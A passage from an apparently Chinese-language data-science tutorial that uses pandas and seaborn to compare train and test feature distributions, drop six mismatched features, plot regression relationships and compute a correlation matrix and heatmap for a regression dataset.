class="string">&quot;Frequency&quot;</span>)</span><br><span class="line">ax = ax.legend([<span class="string">&quot;train&quot;</span>,<span class="string">&quot;test&quot;</span>])</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_24_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>查看所有特征变量下，训练集数据和测试集数据的分布情况，分析并寻找出数据分布不一致的特征变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dist_cols = <span class="number">6</span></span><br><span class="line">dist_rows = <span class="built_in">len</span>(test_data.columns)</span><br><span class="line">plt.figure(figsize=(<span class="number">4</span>*dist_cols,<span class="number">4</span>*dist_rows))</span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> test_data.columns:</span><br><span class="line">    ax=plt.subplot(dist_rows,dist_cols,i)</span><br><span class="line">    ax = sns.kdeplot(train_data[col], color=<span class="string">&quot;Red&quot;</span>, shade=<span class="literal">True</span>)</span><br><span class="line">    ax = sns.kdeplot(test_data[col], color=<span class="string">&quot;Blue&quot;</span>, shade=<span class="literal">True</span>)</span><br><span class="line">    ax.set_xlabel(col)</span><br><span class="line">    ax.set_ylabel(<span class="string">&quot;Frequency&quot;</span>)</span><br><span class="line">    ax = ax.legend([<span class="string">&quot;train&quot;</span>,<span class="string">&quot;test&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_26_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>查看特征’V5’, ‘V17’, ‘V28’, ‘V22’, ‘V11’, 'V9’数据的数据分布</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">drop_col = <span class="number">6</span></span><br><span class="line">drop_row = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">5</span>*drop_col,<span class="number">5</span>*drop_row))</span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> [<span class="string">&quot;V5&quot;</span>,<span class="string">&quot;V9&quot;</span>,<span class="string">&quot;V11&quot;</span>,<span class="string">&quot;V17&quot;</span>,<span class="string">&quot;V22&quot;</span>,<span class="string">&quot;V28&quot;</span>]:</span><br><span class="line">    ax =plt.subplot(drop_row,drop_col,i)</span><br><span class="line">    ax = sns.kdeplot(train_data[col], color=<span class="string">&quot;Red&quot;</span>, shade=<span class="literal">True</span>)</span><br><span class="line">    ax = sns.kdeplot(test_data[col], color=<span class="string">&quot;Blue&quot;</span>, shade=<span class="literal">True</span>)</span><br><span class="line">    ax.set_xlabel(col)</span><br><span class="line">    ax.set_ylabel(<span class="string">&quot;Frequency&quot;</span>)</span><br><span class="line">    ax = ax.legend([<span class="string">&quot;train&quot;</span>,<span class="string">&quot;test&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_28_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>由上图的数据分布可以看到特征’V5’,‘V9’,‘V11’,‘V17’,‘V22’,‘V28’ 训练集数据与测试集数据分布不一致，会导致模型泛化能力差，采用删除此类特征方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop_columns = [<span class="string">&#x27;V5&#x27;</span>,<span class="string">&#x27;V9&#x27;</span>,<span class="string">&#x27;V11&#x27;</span>,<span class="string">&#x27;V17&#x27;</span>,<span class="string">&#x27;V22&#x27;</span>,<span class="string">&#x27;V28&#x27;</span>]</span><br><span class="line"><span class="comment">#合并训练集和测试集数据，并可视化训练集和测试集数据特征分布图</span></span><br></pre></td></tr></table></figure><h1 id="可视化线性回归关系"><a class="markdownIt-Anchor" href="#可视化线性回归关系">#</a> 可视化线性回归关系</h1><p>查看特征变量‘V0’与’target’变量的线性回归关系</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">fcols = <span class="number">2</span></span><br><span class="line">frows = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">8</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">ax=plt.subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">sns.regplot(x=<span class="string">&#x27;V0&#x27;</span>, y=<span class="string">&#x27;target&#x27;</span>, data=train_data, ax=ax, </span><br><span class="line">            scatter_kws=&#123;<span class="string">&#x27;marker&#x27;</span>:<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;s&#x27;</span>:<span class="number">3</span>,<span class="string">&#x27;alpha&#x27;</span>:<span class="number">0.3</span>&#125;,</span><br><span class="line">            line_kws=&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;k&#x27;</span>&#125;);</span><br><span class="line">plt.xlabel(<span class="string">&#x27;V0&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ax=plt.subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">sns.distplot(train_data[<span class="string">&#x27;V0&#x27;</span>].dropna())</span><br><span class="line">plt.xlabel(<span class="string">&#x27;V0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_32_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>查看所有特征变量与’target’变量的线性回归关系</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fcols = <span class="number">6</span></span><br><span class="line">frows = <span class="built_in">len</span>(test_data.columns)</span><br><span class="line">plt.figure(figsize=(<span class="number">5</span>*fcols,<span class="number">4</span>*frows))</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> test_data.columns:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    ax=plt.subplot(frows,fcols,i)</span><br><span class="line">    sns.regplot(x=col, y=<span class="string">&#x27;target&#x27;</span>, data=train_data, ax=ax, </span><br><span class="line">                scatter_kws=&#123;<span class="string">&#x27;marker&#x27;</span>:<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;s&#x27;</span>:<span class="number">3</span>,<span class="string">&#x27;alpha&#x27;</span>:<span class="number">0.3</span>&#125;,</span><br><span class="line">                line_kws=&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;k&#x27;</span>&#125;);</span><br><span class="line">    plt.xlabel(col)</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    ax=plt.subplot(frows,fcols,i)</span><br><span class="line">    sns.distplot(train_data[col].dropna())</span><br><span class="line">    plt.xlabel(col)</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_34_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><h1 id="查看特征变量的相关性"><a class="markdownIt-Anchor" href="#查看特征变量的相关性">#</a> 查看特征变量的相关性</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data_train1 = train_data.drop([<span class="string">&#x27;V5&#x27;</span>,<span class="string">&#x27;V9&#x27;</span>,<span class="string">&#x27;V11&#x27;</span>,<span class="string">&#x27;V17&#x27;</span>,<span class="string">&#x27;V22&#x27;</span>,<span class="string">&#x27;V28&#x27;</span>],axis=<span class="number">1</span>)</span><br><span class="line">train_corr = data_train1.corr()</span><br><span class="line">train_corr</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>V0</th>      <th>V1</th>      <th>V2</th>      <th>V3</th>      <th>V4</th>      <th>V6</th>      <th>V7</th>      <th>V8</th>      <th>V10</th>      <th>V12</th>      <th>...</th>      <th>V29</th>      <th>V30</th>      <th>V31</th>      <th>V32</th>      <th>V33</th>      <th>V34</th>      <th>V35</th>      <th>V36</th>      <th>V37</th>      <th>target</th>    </tr>  </thead>  <tbody>    <tr>      <th>V0</th>      <td>1.000000</td>      <td>0.908607</td>      <td>0.463643</td>      <td>0.409576</td>      <td>0.781212</td>      <td>0.189267</td>      <td>0.141294</td>      <td>0.794013</td>      <td>0.298443</td>      <td>0.751830</td>      <td>...</td>      <td>0.302145</td>      <td>0.156968</td>      <td>0.675003</td>      <td>0.050951</td>      <td>0.056439</td>      <td>-0.019342</td>      <td>0.138933</td>      <td>0.231417</td>      <td>-0.494076</td>      <td>0.873212</td>    </tr>    <tr>      <th>V1</th>      <td>0.908607</td>      <td>1.000000</td>      <td>0.506514</td>      <td>0.383924</td>      <td>0.657790</td>      <td>0.276805</td>      <td>0.205023</td>      <td>0.874650</td>      <td>0.310120</td>      <td>0.656186</td>      <td>...</td>      <td>0.147096</td>      <td>0.175997</td>      <td>0.769745</td>      <td>0.085604</td>      <td>0.035129</td>      <td>-0.029115</td>      <td>0.146329</td>      <td>0.235299</td>      <td>-0.494043</td>      <td>0.871846</td>    </tr>    <tr>      <th>V2</th>      <td>0.463643</td>      <td>0.506514</td>      <td>1.000000</td>      <td>0.410148</td>      <td>0.057697</td>      <td>0.615938</td>      <td>0.477114</td>      <td>0.703431</td>      <td>0.346006</td>      <td>0.059941</td>      <td>...</td>      <td>-0.275764</td>      <td>0.175943</td>      <td>0.653764</td>      <td>0.033942</td>      <td>0.050309</td>      <td>-0.025620</td>      <td>0.043648</td>      <td>0.316462</td>      <td>-0.734956</td>      <td>0.638878</td>    </tr>    <tr>      <th>V3</th>      <td>0.409576</td>      <td>0.383924</td>      <td>0.410148</td>      <td>1.000000</td>      <td>0.315046</td>      <td>0.233896</td>      <td>0.197836</td>      <td>0.411946</td>      <td>0.321262</td>      <td>0.306397</td>      <td>...</td>      <td>0.117610</td>      <td>0.043966</td>      <td>0.421954</td>      <td>-0.092423</td>      <td>-0.007159</td>      <td>-0.031898</td>      <td>0.080034</td>      <td>0.324475</td>      <td>-0.229613</td>      <td>0.512074</td>    </tr>    <tr>      <th>V4</th>      <td>0.781212</td>      <td>0.657790</td>      <td>0.057697</td>      <td>0.315046</td>      <td>1.000000</td>      <td>-0.117529</td>      <td>-0.052370</td>      <td>0.449542</td>      <td>0.141129</td>      <td>0.927685</td>      <td>...</td>      <td>0.659093</td>      <td>0.022807</td>      <td>0.447016</td>      <td>-0.026186</td>      <td>0.062367</td>      <td>0.028659</td>      <td>0.100010</td>      <td>0.113609</td>      <td>-0.031054</td>      <td>0.603984</td>    </tr>    <tr>      <th>V6</th>      <td>0.189267</td>      <td>0.276805</td>      <td>0.615938</td>      <td>0.233896</td>      <td>-0.117529</td>      <td>1.000000</td>      <td>0.917502</td>      <td>0.468233</td>      <td>0.415660</td>      <td>-0.087312</td>      <td>...</td>      <td>-0.467980</td>      <td>0.188907</td>      <td>0.546535</td>      <td>0.144550</td>      <td>0.054210</td>      <td>-0.002914</td>      <td>0.044992</td>      <td>0.433804</td>      <td>-0.404817</td>      <td>0.370037</td>    </tr>    <tr>      <th>V7</th>      <td>0.141294</td>      <td>0.205023</td>      <td>0.477114</td>      <td>0.197836</td>      <td>-0.052370</td>      <td>0.917502</td>      <td>1.000000</td>      <td>0.389987</td>      <td>0.310982</td>      <td>-0.036791</td>      <td>...</td>      <td>-0.311363</td>      <td>0.170113</td>      <td>0.475254</td>      <td>0.122707</td>      <td>0.034508</td>      <td>-0.019103</td>      <td>0.111166</td>      <td>0.340479</td>      <td>-0.292285</td>      <td>0.287815</td>    </tr>    <tr>      <th>V8</th>      <td>0.794013</td>      <td>0.874650</td>      <td>0.703431</td>      <td>0.411946</td>      <td>0.449542</td>      <td>0.468233</td>      <td>0.389987</td>      <td>1.000000</td>      <td>0.419703</td>      <td>0.420557</td>      <td>...</td>      <td>-0.011091</td>      <td>0.150258</td>      <td>0.878072</td>      <td>0.038430</td>      <td>0.026843</td>      <td>-0.036297</td>      <td>0.179167</td>      <td>0.326586</td>      <td>-0.553121</td>      <td>0.831904</td>    </tr>    <tr>      <th>V10</th>      <td>0.298443</td>      <td>0.310120</td>      <td>0.346006</td>      <td>0.321262</td>      <td>0.141129</td>      <td>0.415660</td>      <td>0.310982</td>      <td>0.419703</td>      <td>1.000000</td>      <td>0.140462</td>      <td>...</td>      <td>-0.105042</td>      <td>-0.036705</td>      <td>0.560213</td>      <td>-0.093213</td>      <td>0.016739</td>      <td>-0.026994</td>      <td>0.026846</td>      <td>0.922190</td>      <td>-0.045851</td>      <td>0.394767</td>    </tr>    <tr>      <th>V12</th>      <td>0.751830</td>      <td>0.656186</td>      <td>0.059941</td>      <td>0.306397</td>      <td>0.927685</td>      <td>-0.087312</td>      <td>-0.036791</td>      <td>0.420557</td>      <td>0.140462</td>      <td>1.000000</td>      <td>...</td>      <td>0.666775</td>      <td>0.028866</td>      <td>0.441963</td>      <td>-0.007658</td>      <td>0.046674</td>      <td>0.010122</td>      <td>0.081963</td>      <td>0.112150</td>      <td>-0.054827</td>      <td>0.594189</td>    </tr>    <tr>      <th>V13</th>      <td>0.185144</td>      <td>0.157518</td>      <td>0.204762</td>      <td>-0.003636</td>      <td>0.075993</td>      <td>0.138367</td>      <td>0.110973</td>      <td>0.153299</td>      <td>-0.059553</td>      <td>0.098771</td>      <td>...</td>      <td>0.008235</td>      <td>0.027328</td>      <td>0.113743</td>      <td>0.130598</td>      <td>0.157513</td>      <td>0.116944</td>      <td>0.219906</td>      <td>-0.024751</td>      <td>-0.379714</td>      <td>0.203373</td>    </tr>    <tr>      <th>V14</th>      <td>-0.004144</td>      <td>-0.006268</td>      <td>-0.106282</td>      <td>-0.232677</td>      <td>0.023853</td>      <td>0.072911</td>      <td>0.163931</td>      <td>0.008138</td>      <td>-0.077543</td>      <td>0.020069</td>      <td>...</td>      <td>0.056814</td>      <td>-0.004057</td>      <td>0.010989</td>      <td>0.106581</td>      <td>0.073535</td>      <td>0.043218</td>      <td>0.233523</td>      <td>-0.086217</td>      <td>0.010553</td>      <td>0.008424</td>    </tr>    <tr>      <th>V15</th>      <td>0.314520</td>      <td>0.164702</td>      <td>-0.224573</td>      <td>0.143457</td>      <td>0.615704</td>      <td>-0.431542</td>      <td>-0.291272</td>      <td>0.018366</td>      <td>-0.046737</td>      <td>0.642081</td>      <td>...</td>      <td>0.951314</td>      <td>-0.111311</td>      <td>0.011768</td>      <td>-0.104618</td>      <td>0.050254</td>      <td>0.048602</td>      <td>0.100817</td>      <td>-0.051861</td>      <td>0.245635</td>      <td>0.154020</td>    </tr>    <tr>      <th>V16</th>      <td>0.347357</td>      <td>0.435606</td>      <td>0.782474</td>      <td>0.394517</td>      <td>0.023818</td>      <td>0.847119</td>      <td>0.752683</td>      <td>0.680031</td>      <td>0.546975</td>      <td>0.025736</td>      <td>...</td>      <td>-0.342210</td>      <td>0.154794</td>      <td>0.778538</td>      <td>0.041474</td>      <td>0.028878</td>      <td>-0.054775</td>      <td>0.082293</td>      <td>0.551880</td>      <td>-0.420053</td>      <td>0.536748</td>    </tr>    <tr>      <th>V18</th>      <td>0.148622</td>      <td>0.123862</td>      <td>0.132105</td>      <td>0.022868</td>      <td>0.136022</td>      <td>0.110570</td>      <td>0.098691</td>      <td>0.093682</td>      <td>-0.024693</td>      <td>0.119833</td>      <td>...</td>      <td>0.053958</td>      <td>0.470341</td>      <td>0.079718</td>      <td>0.411967</td>      <td>0.512139</td>      <td>0.365410</td>      <td>0.152088</td>      <td>0.019603</td>      <td>-0.181937</td>      <td>0.170721</td>    </tr>    <tr>      <th>V19</th>      <td>-0.100294</td>      <td>-0.092673</td>      <td>-0.161802</td>      <td>-0.246008</td>      <td>-0.205729</td>      <td>0.215290</td>      <td>0.158371</td>      <td>-0.144693</td>      <td>0.074903</td>      <td>-0.148319</td>      <td>...</td>      <td>-0.205409</td>      <td>0.100133</td>      <td>-0.131542</td>      <td>0.144018</td>      <td>-0.021517</td>      <td>-0.079753</td>      <td>-0.220737</td>      <td>0.087605</td>      <td>0.012115</td>      <td>-0.114976</td>    </tr>    <tr>      <th>V20</th>      <td>0.462493</td>      <td>0.459795</td>      <td>0.298385</td>      <td>0.289594</td>      <td>0.291309</td>      <td>0.136091</td>      <td>0.089399</td>      <td>0.412868</td>      <td>0.207612</td>      <td>0.271559</td>      <td>...</td>      <td>0.016233</td>      <td>0.086165</td>      <td>0.326863</td>      <td>0.050699</td>      <td>0.009358</td>      <td>-0.000979</td>      <td>0.048981</td>      <td>0.161315</td>      <td>-0.322006</td>      <td>0.444965</td>    </tr>    <tr>      <th>V21</th>      <td>-0.029285</td>      <td>-0.012911</td>      <td>-0.030932</td>      <td>0.114373</td>      <td>0.174025</td>      <td>-0.051806</td>      <td>-0.065300</td>      <td>-0.047839</td>      <td>0.082288</td>      <td>0.144371</td>      <td>...</td>      <td>0.157097</td>      <td>-0.077945</td>      <td>0.053025</td>      <td>-0.159128</td>      <td>-0.087561</td>      <td>-0.053707</td>      <td>-0.199398</td>      <td>0.047340</td>      <td>0.315470</td>      <td>-0.010063</td>    </tr>    <tr>      <th>V23</th>      <td>0.231136</td>      <td>0.222574</td>      <td>0.065509</td>      <td>0.081374</td>      <td>0.196530</td>      <td>0.069901</td>      <td>0.125180</td>      <td>0.174124</td>      <td>-0.066537</td>      <td>0.180049</td>      <td>...</td>      <td>0.116122</td>      <td>0.363963</td>      <td>0.129783</td>      <td>0.367086</td>      <td>0.183666</td>      <td>0.196681</td>      <td>0.635252</td>      <td>-0.035949</td>      <td>-0.187582</td>      <td>0.226331</td>    </tr>    <tr>      <th>V24</th>      <td>-0.324959</td>      <td>-0.233556</td>      <td>0.010225</td>      <td>-0.237326</td>      <td>-0.529866</td>      <td>0.072418</td>      <td>-0.030292</td>      <td>-0.136898</td>      <td>-0.029420</td>      <td>-0.550881</td>      <td>...</td>      <td>-0.642370</td>      <td>0.033532</td>      <td>-0.202097</td>      <td>0.060608</td>      <td>-0.134320</td>      <td>-0.095588</td>      <td>-0.243738</td>      <td>-0.041325</td>      <td>-0.137614</td>      <td>-0.264815</td>    </tr>    <tr>      <th>V25</th>      <td>-0.200706</td>      <td>-0.070627</td>      <td>0.481785</td>      <td>-0.100569</td>      <td>-0.444375</td>      <td>0.438610</td>      <td>0.316744</td>      <td>0.173320</td>      <td>0.079805</td>      <td>-0.448877</td>      <td>...</td>      <td>-0.575154</td>      <td>0.088238</td>      <td>0.201243</td>      <td>0.065501</td>      <td>-0.013312</td>      <td>-0.030747</td>      <td>-0.093948</td>      <td>0.069302</td>      <td>-0.246742</td>      <td>-0.019373</td>    </tr>    <tr>      <th>V26</th>      <td>-0.125140</td>      <td>-0.043012</td>      <td>0.035370</td>      <td>-0.027685</td>      <td>-0.080487</td>      <td>0.106055</td>      <td>0.160566</td>      <td>0.015724</td>      <td>0.072366</td>      <td>-0.124111</td>      <td>...</td>      <td>-0.133694</td>      <td>-0.057247</td>      <td>0.062879</td>      <td>-0.004545</td>      <td>-0.034596</td>      <td>0.051294</td>      <td>0.085576</td>      <td>0.064963</td>      <td>0.010880</td>      <td>-0.046724</td>    </tr>    <tr>      <th>V27</th>      <td>0.733198</td>      <td>0.824198</td>      <td>0.726250</td>      <td>0.392006</td>      <td>0.412083</td>      <td>0.474441</td>      <td>0.424185</td>      <td>0.901100</td>      <td>0.246085</td>      <td>0.374380</td>      <td>...</td>      <td>-0.032772</td>      <td>0.208074</td>      <td>0.790239</td>      <td>0.095127</td>      <td>0.030135</td>      <td>-0.036123</td>      <td>0.159884</td>      <td>0.226713</td>      <td>-0.617771</td>      <td>0.812585</td>    </tr>    <tr>      <th>V29</th>      <td>0.302145</td>      <td>0.147096</td>      <td>-0.275764</td>      <td>0.117610</td>      <td>0.659093</td>      <td>-0.467980</td>      <td>-0.311363</td>      <td>-0.011091</td>      <td>-0.105042</td>      <td>0.666775</td>      <td>...</td>      <td>1.000000</td>      <td>-0.122817</td>      <td>-0.004364</td>      <td>-0.110699</td>      <td>0.035272</td>      <td>0.035392</td>      <td>0.078588</td>      <td>-0.099309</td>      <td>0.285581</td>      <td>0.123329</td>    </tr>    <tr>      <th>V30</th>      <td>0.156968</td>      <td>0.175997</td>      <td>0.175943</td>      <td>0.043966</td>      <td>0.022807</td>      <td>0.188907</td>      <td>0.170113</td>      <td>0.150258</td>      <td>-0.036705</td>      <td>0.028866</td>      <td>...</td>      <td>-0.122817</td>      <td>1.000000</td>      <td>0.114318</td>      <td>0.695725</td>      <td>0.083693</td>      <td>-0.028573</td>      <td>-0.027987</td>      <td>0.006961</td>      <td>-0.256814</td>      <td>0.187311</td>    </tr>    <tr>      <th>V31</th>      <td>0.675003</td>      <td>0.769745</td>      <td>0.653764</td>      <td>0.421954</td>      <td>0.447016</td>      <td>0.546535</td>      <td>0.475254</td>      <td>0.878072</td>      <td>0.560213</td>      <td>0.441963</td>      <td>...</td>      <td>-0.004364</td>      <td>0.114318</td>      <td>1.000000</td>      <td>0.016782</td>      <td>0.016733</td>      <td>-0.047273</td>      <td>0.152314</td>      <td>0.510851</td>      <td>-0.357785</td>      <td>0.750297</td>    </tr>    <tr>      <th>V32</th>      <td>0.050951</td>      <td>0.085604</td>      <td>0.033942</td>      <td>-0.092423</td>      <td>-0.026186</td>      <td>0.144550</td>      <td>0.122707</td>      <td>0.038430</td>      <td>-0.093213</td>      <td>-0.007658</td>      <td>...</td>      <td>-0.110699</td>      <td>0.695725</td>      <td>0.016782</td>      <td>1.000000</td>      <td>0.105255</td>      <td>0.069300</td>      <td>0.016901</td>      <td>-0.054411</td>      <td>-0.162417</td>      <td>0.066606</td>    </tr>    <tr>      <th>V33</th>      <td>0.056439</td>      <td>0.035129</td>      <td>0.050309</td>      <td>-0.007159</td>      <td>0.062367</td>      <td>0.054210</td>      <td>0.034508</td>      <td>0.026843</td>      <td>0.016739</td>      <td>0.046674</td>      <td>...</td>      <td>0.035272</td>      <td>0.083693</td>      <td>0.016733</td>      <td>0.105255</td>      <td>1.000000</td>      <td>0.719126</td>      <td>0.167597</td>      <td>0.031586</td>      <td>-0.062715</td>      <td>0.077273</td>    </tr>    <tr>      <th>V34</th>      <td>-0.019342</td>      <td>-0.029115</td>      <td>-0.025620</td>      <td>-0.031898</td>      <td>0.028659</td>      <td>-0.002914</td>      <td>-0.019103</td>      <td>-0.036297</td>      <td>-0.026994</td>      <td>0.010122</td>      <td>...</td>      <td>0.035392</td>      <td>-0.028573</td>      <td>-0.047273</td>      <td>0.069300</td>      <td>0.719126</td>      <td>1.000000</td>      <td>0.233616</td>      <td>-0.019032</td>      <td>-0.006854</td>      <td>-0.006034</td>    </tr>    <tr>      <th>V35</th>      <td>0.138933</td>      <td>0.146329</td>      <td>0.043648</td>      <td>0.080034</td>      <td>0.100010</td>      <td>0.044992</td>      <td>0.111166</td>      <td>0.179167</td>      <td>0.026846</td>      <td>0.081963</td>      <td>...</td>      <td>0.078588</td>      <td>-0.027987</td>      <td>0.152314</td>      <td>0.016901</td>      <td>0.167597</td>      <td>0.233616</td>      <td>1.000000</td>      <td>0.025401</td>      <td>-0.077991</td>      <td>0.140294</td>    </tr>    <tr>      <th>V36</th>      <td>0.231417</td>      <td>0.235299</td>      <td>0.316462</td>      <td>0.324475</td>      <td>0.113609</td>      <td>0.433804</td>      <td>0.340479</td>      <td>0.326586</td>      <td>0.922190</td>      <td>0.112150</td>      <td>...</td>      <td>-0.099309</td>      <td>0.006961</td>      <td>0.510851</td>      <td>-0.054411</td>      <td>0.031586</td>      <td>-0.019032</td>      <td>0.025401</td>      <td>1.000000</td>      <td>-0.039478</td>      <td>0.319309</td>    </tr>    <tr>      <th>V37</th>      <td>-0.494076</td>      <td>-0.494043</td>      <td>-0.734956</td>      <td>-0.229613</td>      <td>-0.031054</td>      <td>-0.404817</td>      <td>-0.292285</td>      <td>-0.553121</td>      <td>-0.045851</td>      <td>-0.054827</td>      <td>...</td>      <td>0.285581</td>      <td>-0.256814</td>      <td>-0.357785</td>      <td>-0.162417</td>      <td>-0.062715</td>      <td>-0.006854</td>      <td>-0.077991</td>      <td>-0.039478</td>      <td>1.000000</td>      <td>-0.565795</td>    </tr>    <tr>      <th>target</th>      <td>0.873212</td>      <td>0.871846</td>      <td>0.638878</td>      <td>0.512074</td>      <td>0.603984</td>      <td>0.370037</td>      <td>0.287815</td>      <td>0.831904</td>      <td>0.394767</td>      <td>0.594189</td>      <td>...</td>      <td>0.123329</td>      <td>0.187311</td>      <td>0.750297</td>      <td>0.066606</td>      <td>0.077273</td>      <td>-0.006034</td>      <td>0.140294</td>      <td>0.319309</td>      <td>-0.565795</td>      <td>1.000000</td>    </tr>  </tbody></table><p>33 rows × 33 columns</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画出相关性热力图</span></span><br><span class="line">ax = plt.subplots(figsize=(<span class="number">20</span>, <span class="number">16</span>))<span class="comment">#调整画布大小</span></span><br><span class="line"></span><br><span class="line">ax = sns.heatmap(train_corr, vmax=<span class="number">.8</span>, square=<span class="literal">True</span>, annot=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#画热力图   annot=True 显示系数</span></span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_37_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找出相关程度</span></span><br><span class="line">data_train1 = train_data.drop([<span class="string">&#x27;V5&#x27;</span>,<span class="string">&#x27;V9&#x27;</span>,<span class="string">&#x27;V11&#x27;</span>,<span class="string">&#x27;V17&#x27;</span>,<span class="string">&#x27;V22&#x27;</span>,<span class="string">&#x27;V28&#x27;</span>],axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">20</span>, <span class="number">16</span>))  <span class="comment"># 指定绘图对象宽度和高度</span></span><br><span class="line">colnm = data_train1.columns.tolist()  <span class="comment"># 列表头</span></span><br><span class="line">mcorr = data_train1[colnm].corr(method=<span class="string">&quot;spearman&quot;</span>)  <span class="comment"># 相关系数矩阵，即给出了任意两个变量之间的相关系数</span></span><br><span class="line">mask = np.zeros_like(mcorr, dtype=np.<span class="built_in">bool</span>)  <span class="comment"># 构造与mcorr同维数矩阵 为bool型</span></span><br><span class="line">mask[np.triu_indices_from(mask)] = <span class="literal">True</span>  <span class="comment"># 角分线右侧为True</span></span><br><span class="line">cmap = sns.diverging_palette(<span class="number">220</span>, <span class="number">10</span>, as_cmap=<span class="literal">True</span>)  <span class="comment"># 返回matplotlib colormap对象</span></span><br><span class="line">g = sns.heatmap(mcorr, 